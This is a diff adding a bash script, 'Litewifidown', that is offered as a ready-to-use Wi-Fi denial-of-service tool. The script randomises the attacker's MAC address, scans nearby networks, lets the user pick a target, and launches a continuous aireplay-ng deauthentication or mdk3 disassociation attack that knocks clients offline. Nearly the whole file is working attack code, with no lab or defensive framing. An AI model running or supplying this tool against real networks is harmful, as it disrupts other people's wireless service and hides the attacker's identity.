@@ -1,0 +1,129 @@
+#!/usr/bin/env bash
+# encoding utf-8
+# Created by: Acr4n1us
+# Contact & Changelog: https://github.com/RamalhoSec
+# Bitcoin: 3DppKRbA9Um3z4wnmVtkqnETnvwsip7WkC
+# Version 0.1
+
+
+#::seting terminal colors
+black=$(tput bold; tput setaf 0)
+red=$(tput bold; tput setaf 1)
+green=$(tput bold; tput setaf 2)
+yellow=$(tput bold; tput setaf 3)
+blue=$(tput bold; tput setaf 4)
+magenta=$(tput bold; tput setaf 5)
+cyan=$(tput bold; tput setaf 6)
+white=$(tput bold; tput setaf 7)
+reset=$(tput sgr0)
+#:::::::::::::::::::::::::
+
+
+#::verifications for start
+[ "$UID" != "0" ] && { echo $red"Please runt this tool at root!"; exit 1 ;}
+test $(which aircrack-ng) && printf "${green}[ok]${magenta}aircrack-ng${reset}\n" || apt install aircrack-ng; clear
+test $(which mdk3) && printf "${green}[ok]${magenta}mdk3${reset}\n" || apt install mdk3; clear
+#:::::::::::::::::::::::::
+
+
+#::seting global  default variables
+name="${white}Litewifidown${reset}"
+version="${blue}0.2${reset}"
+mode="Default"
+#:::::::::::::::::::::::::
+
+
+
+#::seting global functions
+f_logo() {
+	clear
+printf "${red}
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒${name}${red}
+▒▒▒▒▒▐▀▀▀█▄▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒█▀─────█▒▒▒▒▒▒▒▒▒▒${white}Created by: ${blue}Acr4n1us${red}
+▒▒▒█────▄─▄─▌▒▒▒▒▒▒▒▒▒${white}Contact: ${blue}https://github.com/RamalhoSec${red}
+▒▒▒▌───██─█▌▌▒▒▒▒▒▒▒▒▒${white}Bitcoin: ${blue}3DppKRbA9Um3z4wnmVtkqnETnvwsip7WkC${red}
+▒▒▒▌───█▌──▌▌▒▒▒▒▒▒▒▒▒
+▒▒▒▌────────▌▒▒▒▒▒▒▒▒▒${white}HOW USE:${red} 
+▒▒█─────────▐▒▒▒▒▒▒▒▒▒${white}    ./${name}${blue}  [options] [interface]${red}
+▒▐▌─▐───────▐▄▄▒▒▒▒▒▒▒
+▒▐▌─▐────────▄▀▀█▒▒▒▒▒${white}    -q${blue}	Quiet attack mode${red}
+▒█──▀▄──▄█▄▀▀▒▒▒▌▀▄▒▒▒${white}	  -i${blue}	Wireless iface name${red}
+▐▌────██▀█░█▄▒▄▄█▀▀▌▒▒${white}	  -a${blue}	Aireplay-ng deauth attack${red}
+▐▌──▌▐───▐░░▐▀░░░░░▌▒▒${white}	  -b${blue}	BSSID of target for -a${red}
+▐▌──▌────▐░░▐░░░░░░▌▒▒${white}	  -m${blue}	Mdk3 deauth attack${red}
+▐───▌────▐░░▐░░░░░░▌▒▒${white}	  -e${blue}	ESSID of target for -m${red}
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒${white}EX: ./${name}${blue} -i <wlan0> -m -e <wifi>${red}\n\n${reset}"
+}
+
+
+
+f_iface() {
+	printf "${blue}List of wlan interface: ${reset}\n${white}$(ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^)${reset}\n${blue}Please select one interface:${white} ";read iface
+	iface=$(ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep "${iface}:" | sed 's/\w://')
+	f_mac
+}
+
+f_scan() {
+	f_logo
+	rm .target-0* -rf >> /dev/null
+	printf "\n${green}================>> Scaning the area <<================$(xterm -e airodump-ng $iface -w $PWD/.target)\n${blue}BSSID\t\t\tCHAN\tAUTH\t ESSID${reset}"
+	printf "\n${white}$(cat .target-01.csv | awk -F ","  '{print $1"\t"$4  "\t" $8 "\t" $14}' | sed 's/ESSID//' | sed 's/Authentication/\tCHAN\tAUTH\t ESSID/' | sed 's/channel//' | sed 's/Power/\tPower/' | sed -n '3,15p')\n${green}======================================================\n${blue}Please select the target: ${white}"
+	read target 	
+	tbssid=$(cat .target-01.csv | grep "${target}" | awk '{print $1}' | sed 's/,//g')
+	tchan=$(cat .target-01.csv | grep "${target}" | awk '{print $6}' | sed 's/,//g')
+	printf "${green}Essid: ${white}${target}\n${green}Bssid: ${white}${tbssid}\n${green}Channel: ${white}${tchan}${reset}\n"	
+	 
+}
+
+f_mac() {
+	ifconfig $iface down
+	macchanger -r $iface >> /dev/null
+	ifconfig $iface up
+}
+
+
+f_air() {
+	printf "\n${red}================>> Starting Deauth <<=================${reset}\n"	
+	airmon-ng start $iface $tchan >> /dev/null	
+	xterm -e aireplay-ng -0 0 -a $tbssid $iface
+	airmon-ng stop $iface >> /dev/null
+}
+
+f_mdk3() {
+	printf "\n${red}================>> Starting Deauth <<=================${reset}\n"
+	airmon-ng start $iface $tchan >> /dev/null	
+	xterm -e mdk3 $iface d -n $target
+	airmon-ng stop $iface >> /dev/null	
+}
+
+f_select() {
+	printf "${red}===============>> Choose Attacktype <<================${reset}\n"
+	printf "${green}[0]${white}Aireplay-ng Deauthenticate attack\n${green}[1]${white}Mdk3 Dissasociation attack\n${blue}Please select the attackmod: ${white}"
+	read mode
+	[ "$mode" != "0" ] && f_mdk3 || f_air
+}
+#:::::::::::::::::::::::::
+
+
+#::start tool
+case $1 in
+--help) f_logo; exit 0 ;;
+-i) f_logo; 
+iface="$2";
+target=$5; 
+tbssid=$5;
+[ "$3" != "-a" ] && f_mdk3 || f_air;;
+-q) iface="$3";
+target=$6; 
+tbssid=$6;
+[ "$4" != "-a" ] && f_mdk3 || f_air;;
+*) f_logo;f_iface;f_scan;f_select;;
+esac
+#::::::::::::::::::::::::::
+
+#::set default configurations
+ifconfig $iface down 
+macchanger -p $iface >> /dev/null
+ifconfig $iface up
+#::::::::::::::::::::::::::
